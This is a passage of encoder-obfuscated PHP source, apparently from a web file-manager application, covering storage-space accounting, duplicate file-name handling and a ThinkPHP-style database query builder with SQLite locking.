{ continue; } $õ‹ÄÌÂò[] = array($ûàÑ•ŞÃ[402], $ªÛŠğå[$ûàÑ•ŞÃ[402]], $ûàÑ•ŞÃ[76], $ªÛŠğå[$ûàÑ•ŞÃ[76]]); } $this->saveAll($õ‹ÄÌÂò); } public function userSpaceReset($•Ë¯…±Ó = false) { $„½‘‰Ù³ =& $_SERVER[³·—™¤¢]; $àô„„©Ë = $this->where(array($„½‘‰Ù³[411] => self::TYPE_USER, $„½‘‰Ù³[505] => $•Ë¯…±Ó, $„½‘‰Ù³[410] => 0))->sum($„½‘‰Ù³[76]); $àô„„©Ë = !$àô„„©Ë || $àô„„©Ë <= 0 ? 0 : $àô„„©Ë; Model($„½‘‰Ù³[513])->userEdit($•Ë¯…±Ó, array($„½‘‰Ù³[1841] => $àô„„©Ë)); } public function targetSpaceUpdate($¡İªÔ¤, $ó‚Ìßå˜) { $¶Ä›ØÛŞ =& $_SERVER[³·—™¤¢]; if (!$ó‚Ìßå˜) { return; } if (!in_array($¡İªÔ¤, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Á±áéí‰ = $this->targetSpaceSize($¡İªÔ¤, $ó‚Ìßå˜); if ($¡İªÔ¤ == self::TYPE_USER) { Model($¶Ä›ØÛŞ[513])->userEdit($ó‚Ìßå˜, array($¶Ä›ØÛŞ[1841] => $Á±áéí‰)); } else { if ($¡İªÔ¤ == self::TYPE_GROUP) { Model($¶Ä›ØÛŞ[522])->groupEdit($ó‚Ìßå˜, array($¶Ä›ØÛŞ[1841] => $Á±áéí‰)); } } } public function targetSpaceSize($ï¿úê·, $÷Â£éÄ) { $½İ”½œ¸ =& $_SERVER[³·—™¤¢]; $‰£¢Šî™ = 0; $û·‘ª‚Ó = $this->sourceRoot($ï¿úê·, $÷Â£éÄ, !0); foreach ($û·‘ª‚Ó as $¹ØôœÎ£) { if (!$¹ØôœÎ£) { continue; } $‰£¢Šî™ += floatval($¹ØôœÎ£[$½İ”½œ¸[76]]); $¨ñ°°¶¶ = array($½İ”½œ¸[590] => array($½İ”½œ¸[550], $½İ”½œ¸[531] . $¹ØôœÎ£[$½İ”½œ¸[402]] . $½İ”½œ¸[551])); $èóñ¯¾Ÿ = Model($½İ”½œ¸[429])->field($½İ”½œ¸[417])->where($¨ñ°°¶¶)->select(); $èóñ¯¾Ÿ = array_to_keyvalue($èóñ¯¾Ÿ, $½İ”½œ¸[12], $½İ”½œ¸[402]); $èóñ¯¾Ÿ = array_unique(array_filter($èóñ¯¾Ÿ)); if ($èóñ¯¾Ÿ) { $¨ñ°°¶¶ = array($½İ”½œ¸[417] => array($½İ”½œ¸[418], $èóñ¯¾Ÿ)); $‰£¢Šî™ += floatval($this->where($¨ñ°°¶¶)->sum($½İ”½œ¸[76])); } } $‰£¢Šî™ = !$‰£¢Šî™ || $‰£¢Šî™ <= 0 ? 0 : $‰£¢Šî™; return $‰£¢Šî™; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¯ôûå¨â) { return $this->fileTypeProfile($¯ôûå¨â, SourceModel::TYPE_USER); } public function groupFileTypeProfile($»œÔ®Âò) { return $this->fileTypeProfile($»œÔ®Âò, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÍÉ‘£ÈÙ, $¸£¨óÊª) { $›”Å²ŸÌ =& $_SERVER[³·—™¤¢]; $£‚«Ö¶ = $›”Å²ŸÌ[2156] . $ÍÉ‘£ÈÙ . $›”Å²ŸÌ[11] . $¸£¨óÊª; $ƒ¨á¦Î– = Cache::get($£‚«Ö¶); if ($ƒ¨á¦Î–) { return $ƒ¨á¦Î–; } $‘ÑêƒÜê = array($›”Å²ŸÌ[583] => 0); if ($ÍÉ‘£ÈÙ != !1) { $‘ÑêƒÜê[$›”Å²ŸÌ[505]] = $ÍÉ‘£ÈÙ; $‘ÑêƒÜê[$›”Å²ŸÌ[411]] = $¸£¨óÊª; } $ËÊºÌœ¦ = array(); $ËÊºÌœ¦[$›”Å²ŸÌ[2157]] = array($›”Å²ŸÌ[2158] => LNG($›”Å²ŸÌ[2157]), $›”Å²ŸÌ[2159] => $this->where($‘ÑêƒÜê)->count(), $›”Å²ŸÌ[585] => $this->where($‘ÑêƒÜê)->sum($›”Å²ŸÌ[76])); $È¸ÄğàÕ = KodIO::fileTypeList(); foreach ($È¸ÄğàÕ as $ƒ›İğüğ => $×ğôÅ¦) { $‘ÑêƒÜê[$›”Å²ŸÌ[412]] = $this->fileTypeWhere($ƒ›İğüğ); $ËÊºÌœ¦[$ƒ›İğüğ] = array($›”Å²ŸÌ[2158] => $×ğôÅ¦[$›”Å²ŸÌ[32]], $›”Å²ŸÌ[2159] => $this->where($‘ÑêƒÜê)->count(), $›”Å²ŸÌ[585] => $this->where($‘ÑêƒÜê)->sum($›”Å²ŸÌ[76])); } Cache::set($£‚«Ö¶, $ËÊºÌœ¦, 1200); return $ËÊºÌœ¦; } public function fileNameExist($½óƒüû¼, $¬©Í£Àµ) { $ÀæèæÓµ =& $_SERVER[³·—™¤¢]; $¿éß¬»» = $this->where(array($ÀæèæÓµ[432] => $½óƒüû¼, $ÀæèæÓµ[32] => $¬©Í£Àµ, $ÀæèæÓµ[431] => 0))->find(); return is_array($¿éß¬»») ? $¿éß¬»»[$ÀæèæÓµ[402]] : !1; } public function childList($´¸çÑ‘…) { $‘¦ÆæŞ§ =& $_SERVER[³·—™¤¢]; $¹š½®Î¡ = $‘¦ÆæŞ§[2134] . $´¸çÑ‘…; if (isset(self::$cacheChildList[$¹š½®Î¡])) { return self::$cacheChildList[$¹š½®Î¡]; } $º«à» = array($‘¦ÆæŞ§[432] => intval($´¸çÑ‘…), $‘¦ÆæŞ§[431] => 0); $±÷¬ï¹ª = $this->where($º«à»)->select(); $±÷¬ï¹ª = $±÷¬ï¹ª ? $±÷¬ï¹ª : array(); self::$cacheChildList[$¹š½®Î¡] = $±÷¬ï¹ª; foreach ($±÷¬ï¹ª as $µÃéèÎ) { $¹š½®Î¡ = $‘¦ÆæŞ§[460] . $µÃéèÎ[$‘¦ÆæŞ§[402]]; self::$cacheSourceInfo[$¹š½®Î¡] = $µÃéèÎ; } return $±÷¬ï¹ª; } public function fileNameAuto($è¹ü©‰ , $‘ÛÓ˜¾, $ÔÄÚÉÈÀ = REPEAT_RENAME, $…ïÉØŒ´ = false) { $Ñ²¹Ğñ =& $_SERVER[³·—™¤¢]; $¢ïÏÜåÇ = get_path_ext($‘ÛÓ˜¾); $³€“¾à = $¢ïÏÜåÇ ? basename($‘ÛÓ˜¾, $Ñ²¹Ğñ[10] . $¢ïÏÜåÇ) . $Ñ²¹Ğñ[2160] . $¢ïÏÜåÇ : $‘ÛÓ˜¾ . $Ñ²¹Ğñ[384]; $© Çˆƒ¡ = array($Ñ²¹Ğñ[432] => $è¹ü©‰ , $Ñ²¹Ğñ[431] => 0, $Ñ²¹Ğñ[32] => array($Ñ²¹Ğñ[383], $³€“¾à)); $Üß‘­‡Ø = $this->field($Ñ²¹Ğñ[32])->where($© Çˆƒ¡)->select(); $¦Ùàµ’ = array_to_keyvalue($Üß‘­‡Ø, $Ñ²¹Ğñ[12], $Ñ²¹Ğñ[32]); return $this->fileNameAutoGet($¦Ùàµ’, $‘ÛÓ˜¾, $ÔÄÚÉÈÀ, $…ïÉØŒ´); } public function fileNameAutoGet($ûüÊ—•ô, $Üöœ À, $î–°îœ, $Çœá®¸Ë) { $ø ´ÒÄ =& $_SERVER[³·—™¤¢]; if ($î–°îœ == REPEAT_REPLACE || !$ûüÊ—•ô || !in_array_not_case($Üöœ À, $ûüÊ—•ô) || $Çœá®¸Ë && $î–°îœ != REPEAT_RENAME_FOLDER) { return $Üöœ À; } if ($î–°îœ == REPEAT_SKIP) { return !1; } $áÈÙ‚øÕ = $ø ´ÒÄ[10] . get_path_ext($Üöœ À); $áÈÙ‚øÕ = $áÈÙ‚øÕ == $ø ´ÒÄ[10] || $Çœá®¸Ë ? $ø ´ÒÄ[12] : $áÈÙ‚øÕ; for ($¹ÃÓô÷Ÿ = 1; $¹ÃÓô÷Ÿ <= count($ûüÊ—•ô) + 1; $¹ÃÓô÷Ÿ++) { $ïŞ¨Â±Ü = substr($Üöœ À, 0, strlen($Üöœ À) - strlen($áÈÙ‚øÕ)); $¢±›Ğ˜ = $ïŞ¨Â±Ü . "\50{$¹ÃÓô÷Ÿ}\x29{$áÈÙ‚øÕ}"; if (!in_array_not_case($¢±›Ğ˜, $ûüÊ—•ô)) { return $¢±›Ğ˜; } } } } goto E—š‘Æäœ; FÃ—Œ·çôŠ: class DbSqlite3 extends DbSqlite3Base { public function query($œñ´””Î) { $¢İ¹È®© =& $_SERVER[³·—™¤¢]; if (!CacheLock::fileLock($¢İ¹È®©[13])) { return !1; } $„±±ÙÒ¸ = parent::query($œñ´””Î); CacheLock::fileUnLock($¢İ¹È®©[13]); return $„±±ÙÒ¸; } public function execute($Æ¾óİğ) { $ˆ²ì˜™Î =& $_SERVER[³·—™¤¢]; if (!CacheLock::fileLock($ˆ²ì˜™Î[13])) { return !1; } $ºİïíÙ´ = parent::execute($Æ¾óİğ); CacheLock::fileUnLock($ˆ²ì˜™Î[13]); return $ºİïíÙ´; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\161" => "\x3c\x3e", "\147\164" => "\x3e", "\145\147\x74" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\74\75", "\156\157\164\x6c\x69\x6b\145" => "\x4e\x4f\124\40\114\111\113\x45", "\154\151\x6b\145" => "\x4c\x49\113\x45", "\151\x6e" => "\111\116", "\x6e\x6f\164\x69\x6e" => "\x4e\117\124\x20\111\x4e", "\156\157\164\x20\x69\x6e" => "\x4e\117\124\x20\111\x4e", "\x62\145\x74\167\145\x65\x6e" => "\102\x45\x54\127\x45\105\x4e", "\156\157\x74\142\145\164\x77\145\x65\156" => "\116\x4f\124\x20\102\105\x54\127\105\x45\116", "\x6e\157\x74\40\142\x65\164\167\x65\x65\156" => "\x4e\117\124\x20\102\x45\x54\127\105\105\x4e"); protected $selectSql = "\123\x45\114\105\x43\x54\45\104\x49\123\x54\111\116\x43\x54\x25\40\x25\106\111\x45\x4c\x44\45\40\x46\122\x4f\x4d\x20\45\124\101\102\x4c\x45\45\45\x4a\117\x49\116\45\45\127\110\105\122\x45\45\x25\107\x52\117\125\120\x25\x25\x48\101\x56\111\116\107\x25\45\117\x52\104\x45\122\45\x25\x4c\111\x4d\x49\x54\45\40\45\125\116\x49\117\x4e\45\45\x43\x4f\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ÂÑŸ‹ˆ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[³·—™¤¢][983], $ÂÑŸ‹ˆ); } public function factory($üóòèÏæ = '') { $†«è¶àè =& $_SERVER[³·—™¤¢]; $üóòèÏæ = $this->parseConfig($üóòèÏæ); if (empty($üóòèÏæ[$†«è¶àè[984]])) { think_exception(think_lang($†«è¶àè[985])); } $this->dbType = ucwords(strtolower($üóòèÏæ[$†«è¶àè[984]])); $º´¥‘­§ = $†«è¶àè[986] . $this->dbType; if (class_exists($º´¥‘­§)) { $ÍÕµä = new $º´¥‘­§($üóòèÏæ); if ($†«è¶àè[987] != strtolower($üóòèÏæ[$†«è¶àè[984]])) { $ÍÕµä->dbType = strtoupper($this->dbType); } else { $ÍÕµä->dbType = $this->_getDsnType($üóòèÏæ[$†«è¶àè[938]]); } } else { think_exception(think_lang($†«è¶àè[988]) . $†«è¶àè[989] . $º´¥‘­§); } return $ÍÕµä; } public function __call($¦ÊÒ²¥, $İ³¼Ã¢ù) { if (method_exists($this, $¦ÊÒ²¥)) { return call_user_func_array(array($this, $¦ÊÒ²¥), $İ³¼Ã¢ù); } } protected function _getDsnType($êµ¥Ñ‰Â) { $’¯‘´§à = explode($_SERVER[³·—™¤¢][4], $êµ¥Ñ‰Â); $Ê“ÑıãÌ = strtoupper(trim($’¯‘´§à[0])); return $Ê“ÑıãÌ; } private function parseConfig($åÄê×Õı = '') { $™ìÃÑ¼³ =& $_SERVER[³·—™¤¢]; if (!empty($åÄê×Õı) && is_string($åÄê×Õı)) { $åÄê×Õı = $this->parseDSN($åÄê×Õı); } elseif (is_array($åÄê×Õı)) { $åÄê×Õı = array_change_key_case($åÄê×Õı); $åÄê×Õı = array($™ìÃÑ¼³[984] => $åÄê×Õı[$™ìÃÑ¼³[990]], $™ìÃÑ¼³[908] => $åÄê×Õı[$™ìÃÑ¼³[991]], $™ìÃÑ¼³[909] => $åÄê×Õı[$™ìÃÑ¼³[992]], $™ìÃÑ¼³[906] => $åÄê×Õı[$™ìÃÑ¼³[993]], $™ìÃÑ¼³[907] => $åÄê×Õı[$™ìÃÑ¼³[994]], $™ìÃÑ¼³[21] => $åÄê×Õı[$™ìÃÑ¼³[995]], $™ìÃÑ¼³[938] => $åÄê×Õı[$™ìÃÑ¼³[996]], $™ìÃÑ¼³[17] => isset($åÄê×Õı[$™ìÃÑ¼³[997]]) ? $åÄê×Õı[$™ìÃÑ¼³[997]] : array()); } elseif (empty($åÄê×Õı)) { if (think_config($™ìÃÑ¼³[998]) && $™ìÃÑ¼³[987] != strtolower(think_config($™ìÃÑ¼³[999]))) { $åÄê×Õı = $this->parseDSN(think_config($™ìÃÑ¼³[998])); } else { $åÄê×Õı = array($™ìÃÑ¼³[984] => think_config($™ìÃÑ¼³[999]), $™ìÃÑ¼³[908] => think_config($™ìÃÑ¼³[1000]), $™ìÃÑ¼³[909] => think_config($™ìÃÑ¼³[1001]), $™ìÃÑ¼³[906] => think_config($™ìÃÑ¼³[1002]), $™ìÃÑ¼³[907] => think_config($™ìÃÑ¼³[1003]), $™ìÃÑ¼³[21] => think_config($™ìÃÑ¼³[246]), $™ìÃÑ¼³[938] => think_config($™ìÃÑ¼³[998]), $™ìÃÑ¼³[17] => think_config($™ìÃÑ¼³[1004])); } } return $åÄê×Õı; } protected function initConnect($Ø‘ì¸ = true) { if (1 == think_config($_SERVER[³·—™¤¢][22])) { $this->_linkID = $this->multiConnect($Ø‘ì¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $à‰¡È‡é => $ğÇ°‹ÙÕ) { $this->_linkID = $ğÇ°‹ÙÕ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($İ¤’“äĞ = false) { $†®Ã›ğÅ =& $_SERVER[³·—™¤¢]; static $–°‚—„¹ = array(); static $¢Å¸íü› = -1; if (empty($–°‚—„¹)) { foreach ($this->config as $¾©ˆÂ˜’ => $¸öâŒ†) { $–°‚—„¹[$¾©ˆÂ˜’] = explode($†®Ã›ğÅ[50], $¸öâŒ†); } } if (think_config($†®Ã›ğÅ[1005])) { if ($İ¤’“äĞ || think_config($†®Ã›ğÅ[395]) === !0) { $ĞŸ†ÙÀƒ = floor(mt_rand(0, think_config($†®Ã›ğÅ[1006]) - 1)); $¢Å¸íü› = $ĞŸ†ÙÀƒ; } else { if (is_numeric(think_config($†®Ã›ğÅ[1007]))) { $ĞŸ†ÙÀƒ = think_config($†®Ã›ğÅ[1007]); } else { $ĞŸ†ÙÀƒ = floor(mt_rand(think_config($†®Ã›ğÅ[1006]), count($–°‚—„¹[$†®Ã›ğÅ[906]]) - 1)); } } } else { $ĞŸ†ÙÀƒ = floor(mt_rand(0, count($–°‚—„¹[$†®Ã›ğÅ[906]]) - 1)); $¢Å¸íü› = $ĞŸ†ÙÀƒ; } $ĞŸ†ÙÀƒ = $¢Å¸íü› !== -1 ? $¢Å¸íü› : $ĞŸ†ÙÀƒ; $»êá€ıè = array($†®Ã›ğÅ[908] => isset($–°‚—„¹[$†®Ã›ğÅ[908]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[908]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[908]][0], $†®Ã›ğÅ[909] => isset($–°‚—„¹[$†®Ã›ğÅ[909]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[909]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[909]][0], $†®Ã›ğÅ[906] => isset($–°‚—„¹[$†®Ã›ğÅ[906]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[906]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[906]][0], $†®Ã›ğÅ[907] => isset($–°‚—„¹[$†®Ã›ğÅ[907]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[907]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[907]][0], $†®Ã›ğÅ[21] => isset($–°‚—„¹[$†®Ã›ğÅ[21]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[21]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[21]][0], $†®Ã›ğÅ[938] => isset($–°‚—„¹[$†®Ã›ğÅ[938]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[938]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[938]][0], $†®Ã›ğÅ[17] => isset($–°‚—„¹[$†®Ã›ğÅ[17]][$ĞŸ†ÙÀƒ]) ? $–°‚—„¹[$†®Ã›ğÅ[17]][$ĞŸ†ÙÀƒ] : $–°‚—„¹[$†®Ã›ğÅ[17]][0]); return $this->connect($»êá€ıè, $ĞŸ†ÙÀƒ); } public function parseDSN($Ü±ËÊ¥×) { $¹ÎÑ–÷™ =& $_SERVER[³·—™¤¢]; if (empty($Ü±ËÊ¥×)) { return !1; } $€Öåı = parse_url($Ü±ËÊ¥×); if ($€Öåı[$¹ÎÑ–÷™[180]]) { $ÎÉ“ˆÃ = array($¹ÎÑ–÷™[984] => $€Öåı[$¹ÎÑ–÷™[180]], $¹ÎÑ–÷™[908] => isset($€Öåı[$¹ÎÑ–÷™[600]]) ? $€Öåı[$¹ÎÑ–÷™[600]] : $¹ÎÑ–÷™[12], $¹ÎÑ–÷™[909] => isset($€Öåı[$¹ÎÑ–÷™[1008]]) ? $€Öåı[$¹ÎÑ–÷™[1008]] : $¹ÎÑ–÷™[12], $¹ÎÑ–÷™[906] => isset($€Öåı[$¹ÎÑ–÷™[181]]) ? $€Öåı[$¹ÎÑ–÷™[181]] : $¹ÎÑ–÷™[12], $¹ÎÑ–÷™[907] => isset($€Öåı[$¹ÎÑ–÷™[182]]) ? $€Öåı[$¹ÎÑ–÷™[182]] : $¹ÎÑ–÷™[12], $¹ÎÑ–÷™[21] => isset($€Öåı[$¹ÎÑ–÷™[84]]) ? substr($€Öåı[$¹ÎÑ–÷™[84]], 1) : $¹ÎÑ–÷™[12]); } else { preg_match($¹ÎÑ–÷™[1009], trim($Ü±ËÊ¥×), $õü›ÙÕ); $ÎÉ“ˆÃ = array($¹ÎÑ–÷™[984] => $õü›ÙÕ[1], $¹ÎÑ–÷™[908] => $õü›ÙÕ[2], $¹ÎÑ–÷™[909] => $õü›ÙÕ[3], $¹ÎÑ–÷™[906] => $õü›ÙÕ[4], $¹ÎÑ–÷™[907] => $õü›ÙÕ[5], $¹ÎÑ–÷™[21] => $õü›ÙÕ[6]); } $ÎÉ“ˆÃ[$¹ÎÑ–÷™[938]] = $¹ÎÑ–÷™[12]; return $ÎÉ“ˆÃ; } protected function debug() { $™æ„Í¾É =& $_SERVER[³·—™¤¢]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $™æ„Í¾É[1010]; if (think_config($™æ„Í¾É[1011])) { think_status($™æ„Í¾É[1012]); think_trace($this->queryStr . $™æ„Í¾É[1013] . think_status($™æ„Í¾É[24], $™æ„Í¾É[1012], 6) . $™æ„Í¾É[1014], $™æ„Í¾É[12], $™æ„Í¾É[1015]); } } protected function parseLock($ÀéæÃÈ = false) { $¥ëÖƒİ =& $_SERVER[³·—™¤¢]; if (!$ÀéæÃÈ) { return $¥ëÖƒİ[12]; } if ($¥ëÖƒİ[940] == $this->dbType) { return $¥ëÖƒİ[1016]; } return $¥ëÖƒİ[1017]; } protected function parseSet($Š¾şè´È) { $ÔÀÙ€è =& $_SERVER[³·—™¤¢]; foreach ($Š¾şè´È as $ªêÈ‚ => $çíÌòşÍ) { if (is_array($çíÌòşÍ) && $ÔÀÙ€è[297] == $çíÌòşÍ[0]) { $—€éÑ÷Ü[] = $this->parseKey($ªêÈ‚) . $ÔÀÙ€è[904] . $çíÌòşÍ[1]; } elseif (is_scalar($çíÌòşÍ) || is_null($çíÌòşÍ)) { $—€éÑ÷Ü[] = $this->parseKey($ªêÈ‚) . $ÔÀÙ€è[904] . $this->parseValue($çíÌòşÍ); } } return $ÔÀÙ€è[1018] . implode($ÔÀÙ€è[50], $—€éÑ÷Ü); } protected function bindParam($ï–ö¹÷, $¥ÄÈÚŠ) { $this->bind[$_SERVER[³·—™¤¢][4] . $ï–ö¹÷] = $¥ÄÈÚŠ; } protected function parseBind($ª‘æ˜­ì) { $ª‘æ˜­ì = array_merge($this->bind, $ª‘æ˜­ì); $this->bind = array(); return $ª‘æ˜­ì; } function parseKey(&$ã®Ì’¡Ÿ, $ÖÄøèÄ = true) { if ($ÖÄøèÄ) { $ã®Ì’¡Ÿ = $this->parseKeyCheck($ã®Ì’¡Ÿ); } return $ã®Ì’¡Ÿ; } function parseKeyCheck($ÂÕÂ¼Óá) { $ÚîÁ±µ¬ =& $_SERVER[³·—™¤¢]; $ÂÕÂ¼Óá = trim($ÂÕÂ¼Óá); if (!preg_match($ÚîÁ±µ¬[1019], $ÂÕÂ¼Óá)) { think_exception($ÚîÁ±µ¬[1020] . $ÂÕÂ¼Óá); } return $ÂÕÂ¼Óá; } protected function parseValue($†£ŒËò¡) { $¡®œÉÏ =& $_SERVER[³·—™¤¢]; if (is_string($†£ŒËò¡)) { $†£ŒËò¡ = $¡®œÉÏ[979] . $this->escapeString($†£ŒËò¡) . $¡®œÉÏ[979]; } elseif (isset($†£ŒËò¡[0]) && is_string($†£ŒËò¡[0]) && strtolower($†£ŒËò¡[0]) == $¡®œÉÏ[297]) { $†£ŒËò¡ = $this->escapeString($†£ŒËò¡[1]); } elseif (is_array($†£ŒËò¡)) { $†£ŒËò¡ = array_map(array($this, $¡®œÉÏ[980]), $†£ŒËò¡); } elseif (is_bool($†£ŒËò¡)) { $†£ŒËò¡ = $†£ŒËò¡ ? $¡®œÉÏ[88] : $¡®œÉÏ[197]; } elseif (is_null($†£ŒËò¡)) { $†£ŒËò¡ = $¡®œÉÏ[103]; } return $†£ŒËò¡; } protected function parseField($İêİ¸ ò) { $±³™•·® =& $_SERVER[³·—™¤¢]; if (is_string($İêİ¸ ò) && strpos($İêİ¸ ò, $±³™•·®[50])) { $İêİ¸ ò = explode($±³™•·®[50], $İêİ¸ ò); } if (is_array($İêİ¸ ò)) { $³ßşç¨‚ = array(); foreach ($İêİ¸ ò as $®çêô£æ => $¨Ô­©áÛ) { if (!is_numeric($®çêô£æ)) { $³ßşç¨‚[] = $this->parseKey($®çêô£æ, !1) . $±³™•·®[1021] . $this->parseKey($¨Ô­©áÛ); } else { $³ßşç¨‚[] = $this->parseKey($¨Ô­©áÛ); } } $şª–¨å¦ = implode($±³™•·®[50], $³ßşç¨‚); } elseif (is_string($İêİ¸ ò) && !empty($İêİ¸ ò)) { $şª–¨å¦ = $İêİ¸ ò; } else { $şª–¨å¦ = $±³™•·®[188]; } return $şª–¨å¦; } protected function parseTable($óƒÍ§Ñ) { $¯§¢ø·‡ =& $_SERVER[³·—™¤¢]; if (is_array($óƒÍ§Ñ)) { $¡ƒ°ÍÂş = array(); foreach ($óƒÍ§Ñ as $ŸÖš“° => $¹ôÑËå) { if (!is_numeric($ŸÖš“°)) { $¡ƒ°ÍÂş[] = $this->parseKey($ŸÖš“°) . $¯§¢ø·‡[53] . $this->parseKey($¹ôÑËå); } else { $¡ƒ°ÍÂş[] = $this->parseKey($ŸÖš“°); } } $óƒÍ§Ñ = $¡ƒ°ÍÂş; } elseif (is_string($óƒÍ§Ñ)) { if (strstr($óƒÍ§Ñ, $¯§¢ø·‡[53])) { return $óƒÍ§Ñ; } $óƒÍ§Ñ = explode($¯§¢ø·‡[50], $óƒÍ§Ñ); array_walk($óƒÍ§Ñ, array($this, $¯§¢ø·‡[926])); } return $¯§¢ø·‡[920] . trim(implode($¯§¢ø·‡[1022], $óƒÍ§Ñ), $¯§¢ø·‡[385]) . $¯§¢ø·‡[920]; } protected function parseWhere($¤æô‡Åº) { $ÙÌã¥ñÉ =& $_SERVER[³·—™¤¢]; $şÊ›½ñ¼ = $ÙÌã¥ñÉ[12]; if (is_string($¤æô‡Åº)) { $şÊ›½ñ¼ = $¤æô‡Åº; } else { $ªºæ–Â¿ = isset($¤æô‡Åº[$ÙÌã¥ñÉ[1023]]) ? strtoupper($¤æô‡Åº[$ÙÌã¥ñÉ[1023]]) : $ÙÌã¥ñÉ[12]; if (in_array($ªºæ–Â¿, array($ÙÌã¥ñÉ[1024], $ÙÌã¥ñÉ[1025], $ÙÌã¥ñÉ[1026]))) { $ªºæ–Â¿ = $ÙÌã¥ñÉ[53] . $ªºæ–Â¿ . $ÙÌã¥ñÉ[53]; unset($¤æô‡Åº[$ÙÌã¥ñÉ[1023]]); } else { $ªºæ–Â¿ = $ÙÌã¥ñÉ[1027]; } foreach ($¤æô‡Åº as $ŸÊÆ×Ä¯ => $ÁĞÅüš®) { $şÊ›½ñ¼ .= $ÙÌã¥ñÉ[277]; if (is_numeric($ŸÊÆ×Ä¯)) { $ŸÊÆ×Ä¯ = $ÙÌã¥ñÉ[1028]; } if (0 === strpos($ŸÊÆ×Ä¯, $ÙÌã¥ñÉ[11])) { $şÊ›½ñ¼ .= $this->parseThinkWhere($ŸÊÆ×Ä¯, $ÁĞÅüš®); } else { if (!preg_match($ÙÌã¥ñÉ[1029], trim($ŸÊÆ×Ä¯))) { think_exception(think_lang($ÙÌã¥ñÉ[1030]) . $ÙÌã¥ñÉ[4] . $ŸÊÆ×Ä¯); } $ÉÏ—íÜ· = is_array($ÁĞÅüš®) && isset($ÁĞÅüš®[$ÙÌã¥ñÉ[1031]]); $ŸÊÆ×Ä¯ = trim($ŸÊÆ×Ä¯); if (strpos($ŸÊÆ×Ä¯, $ÙÌã¥ñÉ[283])) { $Şø¢ÜÍØ = explode($ÙÌã¥ñÉ[283], $ŸÊÆ×Ä¯); $×ÂˆĞâ = array(); foreach ($Şø¢ÜÍØ as $åúĞŸ§ => $›àîµ‹¿) { $‰¾®½Ÿª = $ÉÏ—íÜ· ? $ÁĞÅüš®[$åúĞŸ§] : $ÁĞÅüš®; $×ÂˆĞâ[] = $ÙÌã¥ñÉ[260] . $this->parseWhereItem($this->parseKey($›àîµ‹¿), $‰¾®½Ÿª) . $ÙÌã¥ñÉ[925]; } $şÊ›½ñ¼ .= implode($ÙÌã¥ñÉ[1032], $×ÂˆĞâ); } elseif (strpos($ŸÊÆ×Ä¯, $ÙÌã¥ñÉ[284])) { $Şø¢ÜÍØ = explode($ÙÌã¥ñÉ[284], $ŸÊÆ×Ä¯); $×ÂˆĞâ = array(); foreach ($Şø¢ÜÍØ as $åúĞŸ§ => $›àîµ‹¿) { $‰¾®½Ÿª = $ÉÏ—íÜ· ? $ÁĞÅüš®[$åúĞŸ§] : $ÁĞÅüš®; $×ÂˆĞâ[] = $ÙÌã¥ñÉ[260] . $this->parseWhereItem($this->parseKey($›àîµ‹¿), $‰¾®½Ÿª) . $ÙÌã¥ñÉ[925]; } $şÊ›½ñ¼ .= implode($ÙÌã¥ñÉ[1027], $×ÂˆĞâ); } else { $şÊ›½ñ¼ .= $this->parseWhereItem($this->parseKey($ŸÊÆ×Ä¯), $ÁĞÅüš®); } } $şÊ›½ñ¼ .= $ÙÌã¥ñÉ[278] . $ªºæ–Â¿; } $şÊ›½ñ¼ = substr($şÊ›½ñ¼, 0, -strlen($ªºæ–Â¿)); } return empty($şÊ›½ñ¼) ? $ÙÌã¥ñÉ[12] : $ÙÌã¥ñÉ[1033] . $şÊ›½ñ¼; } protected function parseWhereItem($é¨“ªÄˆ, $ÖÔïÓ¶) { $ùñƒ»ô¬ =& $_SERVER[³·—™¤¢]; $äôøŠ˜Ô = $ùñƒ»ô¬[12]; if (is_array($ÖÔïÓ¶)) { if (is_string($ÖÔïÓ¶[0])) { $£¬§ïŞò = strtolower($ÖÔïÓ¶[0]); if (in_array($ÖÔïÓ¶[0], array($ùñƒ»ô¬[904], $ùñƒ»ô¬[1034], $ùñƒ»ô¬[1035], $ùñƒ»ô¬[1036], $ùñƒ»ô¬[1037], $ùñƒ»ô¬[1038]))) { $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $ÖÔïÓ¶[0] . $ùñƒ»ô¬[53] . $this->parseValue($ÖÔïÓ¶[1]); } elseif (preg_match($ùñƒ»ô¬[1039], $ÖÔïÓ¶[0])) { $äôøŠ˜Ô .= $é¨“ªÄˆ . $ùñƒ»ô¬[53] . $this->exp[$£¬§ïŞò] . $ùñƒ»ô¬[53] . $this->parseValue($ÖÔïÓ¶[1]); } elseif 